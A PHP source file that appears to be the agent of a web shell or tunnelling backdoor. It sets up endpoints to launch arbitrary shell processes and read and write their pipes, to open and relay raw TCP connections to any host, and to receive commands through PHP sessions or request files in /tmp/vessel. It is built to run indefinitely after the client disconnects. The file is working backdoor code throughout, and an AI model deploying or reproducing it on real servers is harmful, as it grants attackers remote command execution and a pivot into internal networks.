<?php
session_start();
ignore_user_abort(true);
set_time_limit(0);

$endpoints = array();

function hello($args)
{
    $firstname = $args[0];
    $lastname = $args[1];
    return "hi $firstname $lastname";
}
$endpoints["hello"] = "hello";

function version($args)
{
    return "0.0.1";
}
$endpoints["version"] = "version";

$child_shells = [];

function spawn_child_shell($args)
{
    global $child_shells;
    if (!function_exists("proc_open")) {
        throw new Exception("Error: proc_open not exists");
    }
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $cwd = getcwd();
    $env = array();
    $proc = proc_open($args[0], $descriptorspec, $pipes, $cwd, $env);
    if (!is_resource($proc)) {
        throw new Exception("Error: spawn failed");
    }
    $child_shells[] = [
        "proc" => $proc,
        "pipes" => $pipes
    ];
    return key($child_shells);
}
$endpoints["spawn_child_shell"] = "spawn_child_shell";

function child_shell_write_stdin($args)
{
    global $child_shells;
    $pipes = $child_shells[$args[0]]["pipes"];
    $ret = fwrite($pipes[0], base64_decode($args[1]));
    fflush($pipes[0]);
    return $ret;
}

$endpoints["child_shell_write_stdin"] = "child_shell_write_stdin";

function child_shell_read_stdout($args)
{
    global $child_shells;
    $pipes = $child_shells[$args[0]]["pipes"];
    return base64_encode(fread($pipes[1], $args[1]));
}

$endpoints["child_shell_read_stdout"] = "child_shell_read_stdout";

function child_shell_close_pipe($args)
{
    global $child_shells;
    $pipes = $child_shells[$args[0]]["pipes"];
    fclose($pipes[$args[1]]);
}
$endpoints["child_shell_close_pipe"] = "child_shell_close_pipe";


function child_shell_exit($args)
{
    global $child_shells;
    $proc = $child_shells[$args[0]]["proc"];
    $pipes = $child_shells[$args[0]]["pipes"];
    unset($child_shells[$args[0]]);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    return proc_close($proc);
}

$endpoints["child_shell_exit"] = "child_shell_exit";

$tcp_sockets = [];

function tcp_socket_connect($args)
{
    global $tcp_sockets;
    if (!function_exists("fsockopen")) {
        throw new Exception("No function fsockopen");
    }
    $socket = fsockopen($args[0], $args[1], $error_code, $error_message);
    if ($error_code != 0) {
        throw new Exception("Socket connect failed: code: $error_code, msg: $error_message");
    }
    if (!$socket) {
        throw new Exception("Socket create failed: error initializing");
    }
    stream_set_blocking($socket, false);
    $tcp_sockets[] = $socket; // TODO: use a random string
    return array_key_last($tcp_sockets);
}

$endpoints["tcp_socket_connect"] = "tcp_socket_connect";

function tcp_socket_write($args)
{
    global $tcp_sockets;
    if (!isset($tcp_sockets[$args[0]])) {
        throw new Exception("Socket not exists");
    }
    $socket = $tcp_sockets[$args[0]];
    if (feof($socket)) {
        unset($tcp_sockets[$args[0]]);
        throw new Exception("SOCKET_CLOSED: reach EOF, bye");
    }
    $message = base64_decode($args[1]);
    return fwrite($socket, $message);
}

$endpoints["tcp_socket_write"] = "tcp_socket_write";

function tcp_socket_read($args)
{
    global $tcp_sockets;
    if (!isset($tcp_sockets[$args[0]])) {
        throw new Exception("Socket not exists");
    }
    $socket = $tcp_sockets[$args[0]];
    if (feof($socket)) {
        unset($tcp_sockets[$args[0]]);
        throw new Exception("SOCKET_CLOSED: reach EOF, bye");
    }
    $result = fread($socket, $args[1]);
    if ($result === false) {
        throw new Exception("read failed");
    }
    return base64_encode($result);
}

$endpoints["tcp_socket_read"] = "tcp_socket_read";

function tcp_socket_close($args)
{
    global $tcp_sockets;
    if (!isset($tcp_sockets[$args[0]])) {
        throw new Exception("Socket not exists");
    }
    $socket = $tcp_sockets[$args[0]];
    fclose($socket);
    unset($tcp_sockets[$args[0]]);
    return true;
}

$endpoints["tcp_socket_close"] = "tcp_socket_close";

function serve_over_session($session_key)
{
    global $endpoints;
    $last_serve_time = time();
    $_SESSION[$session_key] = array(
        "req" => array(),
        "resp" => array(),
    );
    session_write_close();
    while (time() - $last_serve_time < 3600) {
        usleep(10000);
        session_start();
        if (!isset($_SESSION[$session_key])) {
            echo ("session key not found");
            return;
        }
        foreach (array_keys($_SESSION[$session_key]["req"]) as $reqid) {
            $last_serve_time = time();

            $data = json_decode($_SESSION[$session_key]["req"][$reqid]);
            unset($_SESSION[$session_key]["req"][$reqid]);
            $resp = null;
            try {
                $resp = $endpoints[$data->fn]($data->args);
            } catch (Exception $e) {

                $_SESSION[$session_key]["resp"][$reqid] = json_encode([
                    "reqid" => $reqid,
                    "code" => -100,
                    "msg" => $e->getMessage(),
                ]);
                continue;
            }
            $_SESSION[$session_key]["resp"][$reqid] = json_encode([
                "reqid" => $reqid,
                "code" => 0,
                "resp" => $resp,
            ]);
        }
        session_write_close();
    }
    echo "bye";
}

function serve_over_files()
{
    global $endpoints;
    $PREFIX = "vessel";
    $folder = "/tmp/vessel";

    mkdir($folder, 0777, true);

    while (is_dir($folder . "/")) {
        foreach (scandir($folder) as $filename) {
            if ($filename == "." || $filename == "..") {
                continue;
            }
            $filepath = "$folder/$filename";
            $matches = null;
            if (preg_match("/^vessel_([a-z0-9]+)_req/", $filename, $matches)) {
                $reqid = $matches[1];
                $content = file_get_contents($filepath);
                @unlink($filepath);
                $data = null;
                try {
                    $data = json_decode($content);
                } catch (Exception $e) {
                    continue;
                }
                $resp = null;
                try {
                    $resp = $endpoints[$data->fn]($data->args);
                } catch (Exception $e) {
                    file_put_contents("$folder/{$PREFIX}_{$reqid}_resp", json_encode([
                        "reqid" => $reqid,
                        "code" => -100,
                        "msg" => $e->getMessage(),
                    ]));
                    continue;
                }
                try {
                    file_put_contents("$folder/{$PREFIX}_{$reqid}_resp", json_encode([
                        "reqid" => $reqid,
                        "code" => 0,
                        "resp" => $resp,
                    ]));
                } catch (Exception $e) {
                    echo $e;
                }
            }
        }
        usleep(5000);
        // php would cache is_dir, clear it
        clearstatcache();
    }
}
